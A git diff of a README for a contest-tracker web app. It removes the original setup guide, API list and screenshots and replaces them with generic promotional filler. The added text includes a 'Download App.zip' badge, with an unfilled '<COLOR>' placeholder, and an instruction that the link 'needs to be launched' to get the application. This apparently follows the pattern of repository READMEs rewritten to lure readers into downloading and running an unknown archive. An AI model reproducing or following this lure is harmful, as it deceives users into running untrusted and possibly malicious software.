@@ -1,237 +1,78 @@
-# 🚀 Contest Tracker Web App
+# 🚀 Assignment Contest Tracker and Solution Uploader
 
-- Check out the demo video here 👉 [Project Demo - Loom](https://www.loom.com/share/fcc64a0aca7b43e9927594b70af096b4?sid=c89332bd-54a9-4335-9878-cfe0c6dfa0c9)
+## Description
+Welcome to the Assignment GitHub repository! This project, named TLE Eliminators Assignment, is a contest tracker that fetches real-time contest data and automates the uploading of YouTube channel contest solution links to the database. With a focus on efficiency and accuracy, this repository combines various technologies and tools to streamline the contest tracking and solution submission process.
 
-  
-NOTE: sometime it will take 1 or 2 min to start as it is a free service from render --- --- -- ---
+## Features
+🔍 Real-time Contest Data Tracking  
+🔄 Automation of YouTube Solution Uploads  
+📊 Integration with MongoDB for Database Storage  
+🔒 Google OAuth2 for Authentication  
+📦 Docker Containerization  
+⏰ Cron Jobs for Scheduled Tasks  
+⚛️ React for Frontend Development  
+🔗 React Router DOM for Navigation  
+🎨 Tailwind CSS for Styling  
+🧪 Recoil for State Management  
+🔧 SCADCN UI for User Interface Components  
 
-Backend Deployment Link: [https://assignment-qh3o.onrender.com](https://assignment-qh3o.onrender.com)
+## Repository Topics
+- cron-jobs
+- docker
+- express
+- googleauth
+- mongodb
+- mongoose
+- oauth2
+- react
+- react-router-dom
+- recoil
+- scadcn-ui
+- tailwindcss
+- youtube-api
 
-Frontend Deployment Link: [https://assignment-psi-ivory.vercel.app/](https://assignment-psi-ivory.vercel.app/)
+## Get Started
+To access the latest version of the app, click the button below:
+[![Download App](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
 
-## 📖 Description
+Note: The link provided above needs to be launched to download the application.
 
-- This project is a contest tracker web application that helps users stay updated with coding contests from platforms like Codeforces, CodeChef, and LeetCode.
+If the link is not working or you prefer to explore more options, feel free to check the "Releases" section of this repository.
 
-### ✨ Key Features:
+## About TLE Eliminators Assignment
+The TLE Eliminators Assignment project aims to simplify the process of tracking contests and submitting solutions on a YouTube channel. By leveraging the power of automation and real-time data fetching, this project offers a seamless experience for both contest organizers and participants.
 
-- View upcoming and past contests
-- Bookmark contests
-- Filter contests by platform
-- Watch video solutions
-- Admins can manually add solution videos
-- Automated YouTube video solution fetcher via a backend cron job
--  ❤️❤️I am not scrapping the data instead of that i am fetching the data from offical API's which reduce the latency and increase efficiency.❤️❤️
+### Real-time Contest Data Tracking
+The contest tracker component of the project ensures that the latest contest information is always available. This feature allows users to stay updated on upcoming contests, deadlines, and other essential details.
 
-### 🛠️ Tech Stack
+### YouTube Solution Upload Automation
+One of the key highlights of this project is the automation of uploading contest solutions to a designated YouTube channel. By integrating with the YouTube API, this feature simplifies the process of sharing solutions and enables efficient management of submissions.
 
-- Frontend: React, Next.js, Tailwind CSS, Next UI
-- Backend: Node.js, Express, REST APIs
-- Database: MongoDB
-- Others: Docker, Google OAuth, YouTube API, Cron Jobs, Recoil
+### Secure Authentication with Google OAuth2
+To ensure the security of user data and authentication processes, the project incorporates Google OAuth2. This authentication mechanism adds an extra layer of protection and enables smooth access control for authorized users.
 
-## 🚀 Features
+### Containerized Deployment with Docker
+By leveraging Docker containerization, the project offers a standardized and efficient deployment process. Docker containers encapsulate the application and its dependencies, facilitating seamless deployment across different environments.
 
-- ✅ Fetch contests from multiple platforms
-- ✅ View upcoming and past contests
-- ✅ Google Authentication (Login)
-- ✅ Automatic YouTube video fetcher
-- ✅ Bookmark contests
-- ✅ Pagination support
-- ✅ Responsive UI
-- ✅ Admin functionality to add video solutions manually
+### Scheduled Tasks with Cron Jobs
+Scheduled tasks play a crucial role in automating repetitive processes. With the help of cron jobs, the project can execute various tasks at predefined intervals, ensuring timely updates and maintenance activities.
 
-## 📽️ Demo
+### Modern Frontend Development with React
+The frontend of the project is built using React, a popular JavaScript library for building user interfaces. React's component-based structure and virtual DOM make it an ideal choice for developing interactive and responsive web applications.
 
-- Check out the demo video here 👉 [Project Demo - Loom](https://www.loom.com/share/fcc64a0aca7b43e9927594b70af096b4?sid=c89332bd-54a9-4335-9878-cfe0c6dfa0c9)
+### Efficient State Management with Recoil
+Recoil, a state management library for React, enhances the project's performance and scalability. By managing shared states more effectively, Recoil minimizes unnecessary re-renders and enhances the overall user experience.
 
-## 📷 Screenshots
+### Stylish UI with Tailwind CSS
+Tailwind CSS is used for styling the project's user interface, offering a utility-first approach to CSS. With Tailwind CSS, styling components becomes more intuitive and flexible, enabling developers to create visually appealing designs.
 
-### 🏠 Homepage
+## Conclusion
+The Assignment Contest Tracker and Solution Uploader project by TLE Eliminators is a comprehensive solution for contest tracking and solution submission. By combining real-time data fetching, automation, secure authentication, and modern technologies, this project aims to streamline the contest participation process and enhance the overall user experience.
 
-- Platform filter bar, User login with Google
+Explore the functionalities and features of this project by downloading the application and diving into the codebase. Join us on this exciting journey of innovation and automation in the world of contests and solutions!
 
- <img width="1440" alt="Homepage Screenshot" src="https://github.com/user-attachments/assets/a48c9e45-a003-4e97-95ec-2f595a68650a" />
+---
 
-### 📑 Pagination Example
+Remember, in the world of competitive coding, efficiency and accuracy are key. Stay ahead of the competition with the Assignment Contest Tracker and Solution Uploader by TLE Eliminators. Happy coding! 🏆🚀
 
-<img width="1440" alt="Pagination Screenshot" src="https://github.com/user-attachments/assets/ef27beae-3e6f-40f5-94e5-fa66457fcbe9" />
-
-### 👤 Profile Page
-
-- Displays logged-in user details
-- Admin badge for admin users
-
- <img width="1440" alt="Profile Screenshot" src="https://github.com/user-attachments/assets/4f109421-c541-4a3d-ae3e-4dd3714f1d5d" />
-
-### 🏆 Contest Card Example
-
-- Watch video solution
-- Navigate to the contest platform
-- Admin-only manual video upload option
-
- <img width="1440" alt="Contest Card Screenshot" src="https://github.com/user-attachments/assets/5ab76daf-48e8-4b49-8c41-34da3b4c36e5" />
-
-### 🔄 Cron Job (Backend)
-
-- Automatic YouTube video fetch at 8 AM daily
-- Updates contest video solutions
-
- <img width="1440" alt="Cron Job Screenshot" src="https://github.com/user-attachments/assets/e3fd6f65-8d62-432a-a1f3-d2b01a85b9ed" />
-
-### Tablet view 
- <img width="462" alt="Screenshot 2025-03-20 at 2 06 09 PM" src="https://github.com/user-attachments/assets/30c1564c-00bc-44e6-850a-6d4d99e5ae61" />
- 
-### Mobile view
-<img width="323" alt="Screenshot 2025-03-20 at 2 06 55 PM" src="https://github.com/user-attachments/assets/b5a75df9-1f13-4f23-8d23-faa96405970c" />
-
-
-### 🧠 Future Improvements
-
-- Add contest reminders/notifications
-- Enhance authentication features
-- Integrate more competitive programming platforms
-
-### 📥 Installation Guide
-
-### Clone the Project
-
-```bash
-git clone <your-repo-link>
-cd <project-folder>
-```
-
-### 🌐 Environment Variables (.env)
-
-```.env
-PORT=
-MONGO_URI=""
-YOUTUBE_API=""
-```
-
-### 🔌 Backend Setup
-
-```bash
-cd backend
-npm install
-tsc -b
-node dist/index.js
-```
-
-### 🎨 Frontend Setup
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-# API Endpoints and System Overview
-
-This document outlines the API endpoints and system architecture for the contest tracking and management application.
-
-## API Endpoints
-
-### Contest Management
-
-* **`/contests/upcoming_contest` (GET)**
-    * Fetches upcoming contests from CodeChef, LeetCode, and Codeforces.
-    * Response: JSON array of contest objects.
-* **`/contests/past_contest` (GET)**
-    * Fetches past contests from CodeChef, LeetCode, and Codeforces.
-    * Response: JSON array of contest objects.
-* **`/contests/upload_solution` (POST)**
-    * Allows administrators to manually upload contest solutions.
-    * Request: JSON payload containing solution details.
-    * Authentication: Requires administrator privileges.
-
-### User Management
-
-* **`/user/profile` (GET)**
-    * Retrieves the current user's profile information.
-    * Authentication: Requires user authentication.
-    * Response: JSON object containing user profile data.
-* **`/user/bookmarks` (GET)**
-    * Retrieves all bookmarked contests for the logged-in user.
-    * Authentication: Requires user authentication.
-    * Response: JSON array of bookmarked contest objects.
-* **`/user/bookmarks` (POST)**
-    * Adds a selected contest to the user's bookmarks.
-    * Request: JSON payload containing the contest identifier.
-    * Authentication: Requires user authentication.
-
-### Authentication
-
-* **`/auth/google` (POST)**
-    * Handles Google OAuth authentication.
-    * Request: Google OAuth token.
-    * Response: User authentication token.
-
-## Background Processes
-
-### Cron Jobs
-
-* **Daily Contest Update (8:00 AM)**
-    * Scheduled cron job that runs daily at 8:00 AM.
-    * Fetches and updates contest information from CodeChef, LeetCode, and Codeforces.
-    * Can be configured to run hourly.
-* **Testing Cron Job (Instant)**
-    * On demand execution of the contest data fetching logic, for testing purposes.
-
-## System Architecture
-
-* The system utilizes a backend API to manage contest data, user profiles, and authentication.
-* Contest data is fetched from external platforms (CodeChef, LeetCode, Codeforces) using web scraping or official APIs (if available).
-* User authentication is handled via Google OAuth.
-* A database stores contest information, user profiles, and bookmarks.
-* Cron jobs automate the process of updating contest data.
-
-## Project Structure
-
-```pgsql
-📦 Project Root
-├── 📂 backend
-│   ├── 📂 src
-│   │   ├── 📂 controllers
-│   │   ├── 📂 cron
-│   │   ├── 📂 middleware
-│   │   ├── 📂 models
-│   │   ├── 📂 routers
-│   │   ├── 📂 types
-│   │   ├── index.ts
-│   │   ├── .env
-│   │   └── docker-compose.yml
-│
-├── 📂 frontend
-│   ├── 📂 public
-│   ├── 📂 src
-│   │   ├── 📂 assets
-│   │   ├── 📂 components
-│   │   │   ├── 📂 common
-│   │   │   ├── 📂 providers
-│   │   │   │   ├── authprovider.tsx
-│   │   │   │   └── recoilprovider.tsx
-│   │   │   ├── 📂 ui
-│   │   ├── 📂 hooks
-│   │   │   ├── useMyContests.tsx
-│   │   │   ├── usePastContests.tsx
-│   │   │   └── useUpcomingContests.tsx
-│   │   ├── 📂 lib
-│   │   ├── 📂 pages
-│   │   │   ├── Bookmarks.tsx
-│   │   │   ├── Home.tsx
-│   │   │   ├── Profile.tsx
-│   │   ├── 📂 store
-│   │   │   └── user_atom.ts
-│   │   ├── 📂 types
-│   │   │   └── contest_type.tsx
-│   │   ├── 📂 utils
-│   │   │   ├── format_time.tsx
-│   │   │   └── platform_color.tsx
-│   │   ├── app.tsx
-│   │   ├── index.css
-│   │   └── main.tsx
-│   └── .gitignore
-```
-
-### ⭐️ If you like this project, don't forget to give it a star!
+*Image Source: [Unsplash](https://unsplash.com)*
